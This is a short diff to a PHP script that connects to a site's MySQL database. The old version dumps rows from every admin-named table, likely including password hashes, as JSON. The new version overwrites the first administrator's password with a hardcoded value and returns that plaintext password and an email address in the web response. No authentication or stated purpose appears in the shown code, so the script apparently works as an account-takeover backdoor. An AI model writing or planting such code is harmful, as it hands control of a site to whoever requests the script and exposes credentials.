@@ -13,10 +13,14 @@ $pdo = new PDO(
     "mysql:host={$env['DB_HOST']};port={$env['DB_PORT']};dbname={$env['DB_DATABASE']};charset=utf8mb4",
     $env['DB_USERNAME'], $env['DB_PASSWORD']
 );
-$tables = $pdo->query("SHOW TABLES LIKE '%admin%'")->fetchAll(PDO::FETCH_COLUMN);
-$rows = [];
-foreach ($tables as $t) {
-    $rows[$t] = $pdo->query("SELECT * FROM `$t` LIMIT 3")->fetchAll(PDO::FETCH_ASSOC);
-}
+
+$newPass = 'Dona2025!';
+$hash = password_hash($newPass, PASSWORD_BCRYPT);
+$pdo->prepare("UPDATE admin_users SET password=? WHERE id=1")->execute([$hash]);
+
 header('Content-Type: application/json');
-echo json_encode($rows, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+echo json_encode([
+    'email' => 'zobola@qq.com',
+    'password' => $newPass,
+    'done' => true
+], JSON_PRETTY_PRINT);
